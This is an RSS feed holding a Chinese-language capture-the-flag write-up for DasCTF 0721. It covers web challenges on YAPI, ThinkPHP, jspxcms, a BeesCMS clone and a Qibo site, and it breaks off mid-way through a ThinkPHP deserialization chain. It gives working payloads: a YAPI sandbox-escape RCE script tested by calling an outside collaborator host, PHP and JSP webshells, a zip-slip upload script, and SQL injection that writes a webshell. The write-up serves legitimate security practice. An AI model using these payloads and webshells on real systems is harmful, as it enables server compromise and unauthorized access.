<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/posts/</link><description>Recent content in Posts on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 05 Aug 2021 23:15:47 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>DasCTF0721 Wp</title><link>https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/</link><pubDate>Thu, 05 Aug 2021 23:15:47 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/</guid><description>&lt;h2 id="cat-flag">cat flag&lt;/h2>
&lt;blockquote>
&lt;p>简简单单cat flag&lt;/p>
&lt;p>Hint: 管理员曾访问过flag&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;cmd&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;cmd&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">escapeshellarg&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;cat &amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>提示管理员访问过，先&lt;code>cat /var/log/nginx/access.log&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210802142131657.png" alt="image-20210802142131657">&lt;/p>
&lt;p>之后用&lt;code>%fa&lt;/code>绕过 &lt;code>/?cmd=this_is_final_fl%faag_e2a457126032b42d.php&lt;/code>&lt;/p>
&lt;p>review - &lt;strong>Nginx 重要文件目录：&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>配置文件存放目录：/etc/nginx&lt;/li>
&lt;li>主要配置文件：/etc/nginx/conf/nginx.conf&lt;/li>
&lt;li>管理脚本：/usr/lib64/systemd/system/nginx.service&lt;/li>
&lt;li>模块：/usr/lisb64/nginx/modules&lt;/li>
&lt;li>应用程序：/usr/sbin/nginx&lt;/li>
&lt;li>程序默认存放位置：/usr/share/nginx/html&lt;/li>
&lt;li>日志默认存放位置：/var/log/nginx/access.log&lt;/li>
&lt;/ul>
&lt;h2 id="ezrce">ezrce&lt;/h2>
&lt;blockquote>
&lt;p>你真的会 nodejs 吗？&lt;/p>
&lt;/blockquote>
&lt;p>是一个YAPI的主页，根据题目里rce的提示 搜搜看已知的漏洞：&lt;a href="https://blog.csdn.net/XavierDarkness/article/details/118662886">Yapi 存在远程命令执行漏洞&lt;/a>&lt;/p>
&lt;p>那就好办了 跟着来就行咯；首先创建一个项目&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731153231688.png" alt="image-20210731153231688">&lt;/p>
&lt;p>之后修改全局mock脚本&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">ObjectConstructor&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">FunctionConstructor&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ObjectConstructor&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">myfun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">FunctionConstructor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;return process&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">process&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">myfun&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">mockjson&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mainModule&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">execSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;command&amp;#34;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后添加接口&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731154705721.png" alt="image-20210731154705721">&lt;/p>
&lt;p>脚本中的execSync()处可rce，先用&lt;code>wget http://xxxxx.burpcollaborator.net&lt;/code>试试水&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731154732738.png" alt="image-20210731154732738">&lt;/p>
&lt;p>很顺利嘛 好耶！&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">cat &lt;span style="color:#d88200">`&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // spawnSync /bin/sh ENOBUFS
cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;/span> ../&lt;span style="color:#111">;&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // config.json, init.lock, log, vendors
cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;/span> ../../&lt;span style="color:#111">;&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // app, bin, boot, dev, etc, ffffffflllllaggggg, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, start.sh, tmp, usr, var
&lt;span style="color:#111">cd&lt;/span> ../../&lt;span style="color:#111">;&lt;/span>cat &lt;span style="color:#d88200">`&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // app, bin,boot, dev, etc, home, lib, lib64, media, mnt,opt, proc, root, run, sbin, srv, sys, tmp, usr, var
cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;/span> ../../&lt;span style="color:#111">;&lt;/span>cat ffffffflllllaggggg&lt;span style="color:#d88200">`&lt;/span> // flag&lt;span style="color:#f92672">{&lt;/span>5d096f4f-8c32-49b6-bed4-b485eb1cf08b&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="easythinkphp">easythinkphp&lt;/h2>
&lt;blockquote>
&lt;p>easythinkphp&lt;/p>
&lt;/blockquote>
&lt;p>只有一个thinkphp 3.2.3的欢迎页面，tp的洞很多 可以直接拿来打，参考：&lt;a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">【漏洞通报】ThinkPHP3.2.x RCE漏洞通报&lt;/a>&lt;/p>
&lt;pre>&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=phpinfo();?&amp;gt;
/index.php?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=./Application/Runtime/Logs/Common/21_08_01.log
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801011103992.png" alt="image-20210801011103992">&lt;/p>
&lt;p>先验证一下文档中的方法，成功，之后把phpinfo换成自己的一句话木马&lt;/p>
&lt;pre>&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=eval($_POST['wuhu']);?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>传入后 用蚁剑连接就能拿flag了~&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801012307515.png" alt="image-20210801012307515">&lt;/p>
&lt;p>或者也可以直接使用&lt;a href="https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.2">ThinkphpGUI&lt;/a>一把梭！一键getshell 你值得拥有&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803170035307.png" alt="image-20210803170035307">&lt;/p>
&lt;h2 id="jspxcms">jspxcms&lt;/h2>
&lt;p>也有现成的洞可以直接用，参考：&lt;a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">复现jspxcms解压getshell漏洞&lt;/a> | &lt;a href="https://www.shengchulai.com/blog-NJwAv8oZV1.htm">代码审计| Jspxcms文件上传漏洞(CNVD-2019-40540)&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/188788">记一次由追踪溯源发现的“不安全解压getshell”&lt;/a>&lt;/p>
&lt;p>首先构造含jsp🐎的恶意war包，🐎长这样&lt;/p>
&lt;pre>&lt;code class="language-jsp" data-lang="jsp">&amp;lt;%
if(&amp;quot;023&amp;quot;.equals(request.getParameter(&amp;quot;pwd&amp;quot;))){
java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&amp;quot;wuhu&amp;quot;)).getInputStream();
int a = -1;
byte[] b = new byte[2048];
out.print(&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;);
while((a=in.read(b))!=-1){
out.println(new String(b));
}
out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);
}
%&amp;gt;
&lt;/code>&lt;/pre>&lt;p>之后放入一个解压后会自动完成目录穿越的zip包中 这个过程由py脚本完成&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">binary&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;script&amp;gt;alert(&amp;#34;helloworld&amp;#34;)&amp;lt;/script&amp;gt;&amp;#39;&lt;/span>
&lt;span style="color:#111">zipFile&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test123.zip&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZIP_DEFLATED&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipInfo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test123.zip&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">zipFile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">writestr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;../../../../dog123.html&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">binary&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">zipFile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">IOError&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">e&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>
&lt;span style="color:#111">z&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test123.zip&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZIP_DEFLATED&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;wuhu.war&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">z&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">writestr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;../../../../wuhu.war&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">z&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>需要注意的是 最终我们要穿越到的目录是网站根目录的上层，即webapps目录下 与ROOT目录同级，当war包位于这个目录下才会自动部署&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801013622428.png" alt="image-20210801013622428">&lt;/p>
&lt;p>直接&lt;code>cat /flag&lt;/code>就好啦&lt;/p>
&lt;h2 id="cybercms">cybercms&lt;/h2>
&lt;blockquote>
&lt;p>赛博CMS，只为安全而生&lt;/p>
&lt;p>Hint：信息搜集是一个web手必备的技能&lt;/p>
&lt;/blockquote>
&lt;p>一个（伪）cms平台介绍的页面，比较简陋，首页/应用案例处显示hacked by ymnh，在ymnh的咨询页面处有这样的报错&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801031306740.png" alt="image-20210801031306740">&lt;/p>
&lt;p>在首页/新闻动态处，几乎所有的帖子都是hacked by xxx~~（本来我还以为是多么复杂的长篇大论）~~，在如何安装和使用模板这篇下有没删干净的东西&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801031809386.png" alt="image-20210801031809386">&lt;/p>
&lt;p>如何设置进站语言这篇里竟然是这样的&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801032406665.png" alt="image-20210801032406665">&lt;/p>
&lt;p>草 真是蚌埠住了 图穷匕见了属于是2333333&lt;/p>
&lt;p>根据这些，可以得知整个站是完全移植/套壳beescms的 所以接着去找已存在的洞，参考：&lt;a href="https://www.cnblogs.com/yuzly/p/11423384.html">Beescms_v4.0 sql注入漏洞分析&lt;/a>&lt;/p>
&lt;p>在admin后加单引号，提示&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801113627407.png" alt="image-20210801113627407">&lt;/p>
&lt;p>表名是bees_admin，有id, admin_name, admin_password, admin_purview, is_disable共5个字段&lt;/p>
&lt;p>简单fuzz可知：过滤了空格（用&lt;code>/**/&lt;/code>绕过）（或者用&lt;code>tab&lt;/code>绕过 或者&lt;code>%0a&lt;/code>绕过 都可以），过滤了select, outfile（双写绕过），对尖括号转义为html实体（用hex绕过）&lt;/p>
&lt;pre>&lt;code>user=admin'/**/union/**/selselectect/**/1,2,3,4,5#
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121138555.png" alt="image-20210801121138555">&lt;/p>
&lt;p>回显正常，接着尝试写入shell（这里要写清楚绝对路径，在上面的一张报错的页面也有所提示了）&lt;/p>
&lt;pre>&lt;code>admin'/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/'/var/www/html/wuhu.php'#
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121645243.png" alt="image-20210801121645243">&lt;/p>
&lt;p>好耶，连蚁剑拿flag咯&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121853464.png" alt="image-20210801121853464">&lt;/p>
&lt;h2 id="ez_website">ez_website&lt;/h2>
&lt;blockquote>
&lt;p>简单的题目&lt;/p>
&lt;/blockquote>
&lt;p>也是现实世界存在的东西，参考：&lt;a href="https://ma4ter.cn/2527.html">齐博建站系统x1.0代码审计&lt;/a>&lt;/p>
&lt;p>直接用已有的链子打&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\process\pipes&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Windows&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#75715e">//$file =&amp;gt; /think/Model的子类new Pivot(); Model是抽象类
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$append&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$error&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$parent&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">parent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$this-&amp;gt;parent=&amp;gt; think\console\Output;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">append&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;xxx&amp;#34;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#d88200">&amp;#34;getError&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">//调用getError 返回this-&amp;gt;error
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">error&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $this-&amp;gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&amp;gt;&amp;gt;HasOne
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Pivot&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">parent&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\model\relation&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HasOne&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#75af00">OneToOne&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\model\relation&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OneToOne&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$selfRelation&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$bindAttr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">selfRelation&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$query指向Query
